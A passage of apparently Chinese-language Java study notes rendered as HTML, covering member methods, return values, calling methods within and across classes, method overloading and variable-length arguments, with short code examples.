punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这个时候输出b.age会出现异常</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220817145603.png" style="zoom:80%;" /></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220817145700.png"></p></li></ol><h2 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h2><ol><li>  某些情况下，需要<strong>定义成员方法</strong>，简称方法</li><li>  比如人类：除了由一些属性（年龄，姓名）以外，还要有<strong>一些行为</strong>，例如说话等</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Method01</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//方法使用</span>        <span class="token comment">//1. 方法写好后，不去显式调用不会使用方法</span>        <span class="token comment">//2. 先创建对象，创建对象后和调用属性的方式相同调用方法</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p1<span class="token punctuation">.</span><span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token comment">// public 表示方法是公开的</span>    <span class="token comment">// void 表示方法没有返回值</span>    <span class="token comment">// &#123;&#125; 大括号内是方法体，嵌入执行代码</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Method02</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p1<span class="token punctuation">.</span><span class="token function">cal01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p1<span class="token punctuation">.</span><span class="token function">cal02</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用cal02方法，并且将5传给cal02fan</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cal01</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res <span class="token operator">+=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"计算结果"</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cal02</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// (int n) 形参列表，表示当前有一个形参n，可以接受用户输入</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res <span class="token operator">+=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"res的结果为"</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Method02</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p1<span class="token punctuation">.</span><span class="token function">cal01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p1<span class="token punctuation">.</span><span class="token function">cal02</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用cal02方法，并且将5传给cal02方法</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cal01</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res <span class="token operator">+=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"计算结果"</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cal02</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// (int n) 形参列表，表示当前有一个形参n，可以接受用户输入</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res <span class="token operator">+=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"res的结果为"</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> num1<span class="token punctuation">,</span><span class="token keyword">int</span> num2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//(int num1.int num2)形参列表，2个形参，可以接受用户传入的两个数</span><span class="token keyword">int</span> res <span class="token operator">=</span> num1 <span class="token operator">+</span> num2<span class="token punctuation">;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span> <span class="token comment">//表示把res的值，返回</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法的妙用"><a href="#方法的妙用" class="headerlink" title="方法的妙用"></a>方法的妙用</h3><ol><li>  <strong>避免冗余度太高</strong>：当需要多次调用时，可以放到外面多次调用,<strong>提高代码的复用性</strong></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Method03</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Tools</span> tool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tools</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> tool<span class="token punctuation">.</span><span class="token function">getSum</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Tools</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> map<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res <span class="token operator">+=</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>  可以将实现的细节<strong>封装起来</strong>，然后供<strong>其它用户来调用</strong>即可</li></ol><h3 id="成员方法的定义"><a href="#成员方法的定义" class="headerlink" title="成员方法的定义"></a>成员方法的定义</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">访问修饰符<span class="token punctuation">[</span><span class="token keyword">public</span> <span class="token keyword">private</span> <span class="token keyword">protected</span><span class="token punctuation">]</span> 返回数据类型<span class="token punctuation">[</span><span class="token keyword">void</span> <span class="token keyword">int</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span> 方法名 <span class="token punctuation">(</span>形参列表<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//方法体语句</span><span class="token keyword">return</span> 返回值<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  如果不写，为默认访问修饰符，default</li></ol><h4 id="返回数据类型"><a href="#返回数据类型" class="headerlink" title="返回数据类型"></a>返回数据类型</h4><ol><li><p>  一个方法最多返回一个值</p></li><li><p>如果想要返回多个结果，则需要返回一个数组，将结果封装到一个数组中去 (即将返回值设为int[]等数组类型)</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MethodDetail</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AA</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">AA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getSumAndSub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"sum="</span> <span class="token operator">+</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"sub="</span> <span class="token operator">+</span> res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> AA<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getSumAndSub</span><span class="token punctuation">(</span><span class="token keyword">int</span> num1<span class="token punctuation">,</span><span class="token keyword">int</span> num2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> num1 <span class="token operator">+</span> num2<span class="token punctuation">;</span>        res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> num1 <span class="token operator">-</span> num2<span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token comment">//这个地方res是一个数组，所以应该返回一个地址</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  返回类型可以为任意类型，包括基本数据类型和引用类型(数组，对象)</p></li><li><p>  返回值类型必须和return的值类型一致或兼容</p></li><li><p>  void的返回值可以写return，此时return后面不能带任何东西，默认return值为空</p></li></ol><h3 id="注意，方法体里面不能再定义方法"><a href="#注意，方法体里面不能再定义方法" class="headerlink" title="注意，方法体里面不能再定义方法"></a>注意，方法体里面不能再定义方法</h3><ol><li>  方法体里面不能再<strong>定义方法</strong>，不能嵌套应用（注意这个地方是不能定义，而不是不能使用，函数中可以使用函数，<strong>递归</strong>）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220818160044.png"></li></ol><h3 id="方法调用的细节"><a href="#方法调用的细节" class="headerlink" title="方法调用的细节"></a>方法调用的细节</h3><ol><li><p><strong>同一个类中的方法</strong>调用，可以直接调用</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Method03</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">A</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">sayOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"print方法被调用"</span> <span class="token operator">+</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>跨类中的方法A类调用B类方法：需要通过对象名调用（即在A类中再实例化一个变量B）</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Method03</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">A</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">sayOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">m1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"print方法被调用"</span> <span class="token operator">+</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这个地方没有使用.去对象名调用，因为这个函数的定义在同一个类中</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">m1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"m1方法被调用"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">B</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token punctuation">.</span><span class="token function">hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这个地方进行了对象名调用，因为方法的定义不在同一个类中</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"B类中的hi()被执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="重载OverLoad"><a href="#重载OverLoad" class="headerlink" title="重载OverLoad"></a>重载OverLoad</h2><ol><li>  java中允许<strong>同一个类</strong>中，<strong>多个同名方法的存在</strong>，但是要求<strong>形参列表不一致</strong></li><li>  重载的好处：1. 减轻了起名的麻烦 2. 减轻了记名的麻烦</li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220818163820.png"></p></li><li><p>```java<br>  public class Caculation01 {</p><pre><code>  public static void main(String[] args) &#123;      Mycaculator m1 = new Mycaculator();      System.out.println(m1.calculate(1.1, 2.2));      System.out.println(m1.calculate(1, 2));  &#125;</code></pre><p>  }</p><p>  class Mycaculator {</p><pre><code>  public int calculate(int n1, int n2) &#123; // 如果只是参数名不同则不能构成重载      return n1 + n2;  &#125;  public double calculate(int n1, double n2) &#123;      return n1 + n2;  &#125;  public double calculate(double n1, double n2) &#123;      return n1 + n2;  &#125;</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">3.   参数顺序不一样也是重载，先int后double 和 先double后int不同### 方法重载的细节1.   方法名必须相同2.   参数列表：必须不同（形参**类型**或**个数**或**顺序**，**至少有一样不同**，**参数名无要求**）3.   **返回类型不要求**（如果只是返回类型不同而其它都相同，则不构成重载）4.   能否构成重载，就看**在编译的时候是否报错**即可，如果报**已经定义了这个方法**的错误，就不构成重载## 可变参数1.   java允许将同一个类中多个**同名同功能**但是参数个数不同的方法，封装成一个方法2.   &#96;&#96;&#96;java     public class Var&#123;     public static void main(String[] args)&#123;             HspMethod m1 &#x3D; new HspMethod();             System.out.println(m1.sum());         &#125;     &#125;     class HspMethod&#123;         public int sum(int... nums)&#123;            &#x2F;&#x2F;1. ...表示接受的是可变参数，类型是int，即可以接受多个int(0-多)，int... nums,int... nums           &#x2F;&#x2F;2. 使用可变参数时，可以当作数组来使用，即nums可以当作数组，即nums可以取下标，当作数组去处理           &#x2F;&#x2F;3. 遍历nums求和即可           int res &#x3D; 0;           for(int i &#x3D; 0;i &lt; nums.length;i++)&#123; &#x2F;&#x2F;因为可变参数的参数类型可以当作数组去处理，所以可以取length               res +&#x3D; nums[i];           &#125;            return res;         &#125;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  上面的可以通过重载来实现（函数名相同，但是参数不同）</p></li><li><p>  也可以使用可变参数：方法名称相同，功能相同，参数个数不同 -&gt; 使用可变参数优化</p></li></ol><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">访问修饰符 返回类型 方法名<span class="token punctuation">(</span>数据类型<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 形参名<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>  注意这个地方<strong>数据类型后面的三个点是不能够更改的</strong>，是表明参数的个数是多个，省略号</li><li>  数据类型和后面的三个点…是不能够分隔的</li></ol><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>  可变参数的实参可以是0个或任意多个</li><li>  可变参数的实参也可以直接是数组</li><li>  可变参数可以和普通类型的参数一起放在形参列表，但是必须<strong>保证可变参数在最后</strong>，否则编译都会报错，更别提使用了</li><li>  <img 